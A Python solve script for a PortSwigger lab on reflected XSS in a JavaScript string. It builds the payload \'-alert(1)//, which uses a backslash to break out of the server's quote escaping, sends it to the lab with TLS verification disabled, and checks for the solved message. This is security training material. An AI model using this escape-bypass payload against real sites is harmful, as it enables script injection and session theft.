#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets
and double quotes HTML-encoded and single quotes escaped.
Backslash-eats-the-escape: \' becomes \\' freeing the quote.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 19: JS string with angle brackets/double quotes encoded, single quotes escaped"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Build the exploit URL
    payload = "\\'-alert(1)//"
    exploit_url = f"{lab}/?search={quote(payload)}"
    print(f"[+] Exploit URL:\n    {exploit_url}")

    # Step 2: Verify the backslash is not escaped in the response
    r = s.get(exploit_url)
    if "\\\\'-alert(1)//" in r.text:
        print("[+] Payload reflected — backslash not escaped, quote freed")
    else:
        print("[!] Check response manually")

    # Step 3: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Open the exploit URL in a browser to trigger alert(1)")


if __name__ == "__main__":
    main()
